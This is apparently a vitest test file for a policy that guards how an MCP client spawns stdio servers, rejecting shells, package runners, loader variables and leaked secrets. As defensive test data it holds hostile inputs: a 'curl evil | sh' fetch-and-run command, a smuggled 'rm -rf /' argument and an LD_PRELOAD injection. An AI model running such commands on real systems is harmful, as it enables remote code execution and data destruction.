import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { McpSession } from "./session.js";
import {
  PolicyStdioTransport,
  planStdioSpawn,
  validateStdioConfig,
  type StdioPolicy,
} from "./stdio.js";

const NODE = process.execPath;
const FIXTURE = join(dirname(fileURLToPath(import.meta.url)), "../fixtures/stdio-server.mjs");
const policy: StdioPolicy = {
  enabled: true,
  allowedCommands: [
    // either separator: the fixture's path is C:\…\fixtures\… on Windows
    { command: NODE, argsPattern: "\\S+[\\\\/]fixtures[\\\\/]stdio-server\\.mjs" },
    { command: "/usr/bin/python3" },
    { command: "/usr/local/bin/npx" },
    { command: "/bin/sh" },
  ],
  envAllowlist: ["HOME", "LANG"],
  parentEnv: { HOME: "/home/flowaid", LANG: "C.UTF-8", DATABASE_URL: "postgres://secret" },
};

const alive = (pid: number) => {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};

describe("stdio policy", () => {
  it.each([
    ["disabled", { ...policy, enabled: false }, { command: NODE, args: [FIXTURE] }, /disabled/],
    [
      "not allow-listed",
      policy,
      { command: "/usr/bin/ruby", args: ["x.rb"] },
      /not in FLOWAID_MCP_STDIO_ALLOWED_COMMANDS/,
    ],
    [
      "args outside the pattern",
      policy,
      { command: NODE, args: ["/tmp/other.mjs"] },
      /allowed pattern/,
    ],
    [
      "npx -y",
      policy,
      { command: "/usr/local/bin/npx", args: ["-y", "some-server"] },
      /package runners/,
    ],
    ["sh -c", policy, { command: "/bin/sh", args: ["-c", "curl evil | sh"] }, /shells/],
    [
      "python -c",
      policy,
      { command: "/usr/bin/python3", args: ["-c", "import os"] },
      /-c is not allowed/,
    ],
    [
      "metacharacters",
      policy,
      { command: "/usr/bin/python3", args: ["server.py;rm -rf /"] },
      /metacharacters/,
    ],
    ["--eval=", policy, { command: "/usr/bin/python3", args: ["--eval=1"] }, /--eval/],
    [
      "loader env",
      policy,
      { command: "/usr/bin/python3", args: ["s.py"], env: { LD_PRELOAD: "/x.so" } },
      /LD_PRELOAD/,
    ],
  ] as const)("rejects %s", (_n, p, config, message) => {
    expect(() => planStdioSpawn(p, config)).toThrow(message);
  });

  it("builds the child env from the allow-list and the credential only", () => {
    const plan = planStdioSpawn(
      policy,
      {
        command: "/usr/bin/python3",
        args: ["server.py"],
        env: { LANG: "en_US.UTF-8", SECRET: "x" },
      },
      { apiKey: "k" },
    );
    expect(plan.env).toEqual({ HOME: "/home/flowaid", LANG: "en_US.UTF-8", APIKEY: "k" });
  });

  it.each([
    ["path", /PATH/],
    ["home", /HOME/],
    ["lang", /LANG/],
    ["ld-preload", /LD_PRELOAD/],
    ["node_options", /NODE_OPTIONS/],
    ["https_proxy", /HTTPS_PROXY/],
    ["java_tool_options", /JAVA_TOOL_OPTIONS/],
  ])("refuses a credential field %s that would set a system variable", (field, message) => {
    expect(() =>
      planStdioSpawn(policy, { command: "/usr/bin/python3", args: ["s.py"] }, { [field]: "x" }),
    ).toThrow(message);
  });

  it.each([
    "JAVA_TOOL_OPTIONS",
    "_JAVA_OPTIONS",
    "JDK_JAVA_OPTIONS",
    "PYTHONHOME",
    "NODE_EXTRA_CA_CERTS",
    "DOTNET_STARTUP_HOOKS",
  ])("rejects the loader variable %s in the server env", (name) => {
    expect(() =>
      validateStdioConfig({ command: "/usr/bin/python3", args: ["s.py"], env: { [name]: "x" } }),
    ).toThrow(name);
  });

  it("requires absolute commands", () => {
    expect(() => validateStdioConfig({ command: "python3" })).toThrow(/absolute/);
    expect(() => validateStdioConfig({ command: "server.exe" })).toThrow(/absolute/);
  });

  describe("on Windows", () => {
    it("accepts an absolute executable path, including Program Files (x86)", () => {
      for (const command of [
        "C:\\Program Files\\Acme\\mcp-server.exe",
        "C:\\Program Files (x86)\\Acme\\mcp-server.exe",
        "D:/tools/mcp-server.exe",
      ])
        expect(() => validateStdioConfig({ command }), command).not.toThrow();
    });

    it("refuses shells and package runners by name, whatever the extension or case", () => {
      for (const command of [
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.EXE",
        "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
        "C:\\Windows\\System32\\wsl.exe",
        "C:\\Windows\\System32\\mshta.exe",
      ])
        expect(() => validateStdioConfig({ command }), command).toThrow(/shells/);
      expect(() => validateStdioConfig({ command: "C:\\Program Files\\nodejs\\npx.exe" })).toThrow(
        /package runners/,
      );
    });

    it("refuses scripts that Windows would run through a shell", () => {
      for (const command of [
        "C:\\tools\\server.cmd",
        "C:\\tools\\server.BAT",
        "C:\\tools\\server.ps1",
      ])
        expect(() => validateStdioConfig({ command }), command).toThrow(/not a script/);
    });

    it("still refuses shell metacharacters and parent directories", () => {
      expect(() => validateStdioConfig({ command: "C:\\tools\\a&b.exe" })).toThrow(
        /metacharacters/,
      );
      expect(() => validateStdioConfig({ command: "C:\\tools\\..\\cmd.exe" })).toThrow(/absolute/);
    });
  });
});

describe("PolicyStdioTransport", () => {
  it("runs the server in a temp cwd with the scrubbed env and kills its process group on close", async () => {
    const plan = planStdioSpawn(policy, { command: NODE, args: [FIXTURE] });
    const spawned: string[][] = [];
    const transport = new PolicyStdioTransport(plan, {
      onSpawn: (i) => spawned.push(i.envNames),
      killGraceMs: 200,
    });
    const session = await McpSession.connect(transport, { timeoutMs: 10_000 });
    const r = await session.callTool("env", {});
    const info = JSON.parse((r.content[0]?.text as string) ?? "{}") as {
      env: Record<string, string>;
      cwd: string;
      grandchild: number;
    };
    expect(info.env.DATABASE_URL).toBeUndefined();
    expect(info.env.HOME).toBe("/home/flowaid");
    expect(info.cwd).toMatch(/flowaid-mcp-/);
    expect(spawned).toEqual([["HOME", "LANG"]]);
    expect(transport.stderr).toContain("stdio-test ready");
    expect(alive(info.grandchild)).toBe(true);
    await session.close();
    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(alive(info.grandchild)).toBe(false);
  }, 20_000);

  it("closes when the signal aborts", async () => {
    const controller = new AbortController();
    const transport = new PolicyStdioTransport(
      planStdioSpawn(policy, { command: NODE, args: [FIXTURE] }),
      { signal: controller.signal, killGraceMs: 200 },
    );
    let closed = false;
    const session = await McpSession.connect(transport, { timeoutMs: 10_000 });
    transport.onclose = () => (closed = true);
    controller.abort();
    expect(closed).toBe(true);
    expect(session.isOpen).toBe(true); // the session learns on its next call
  }, 20_000);
});
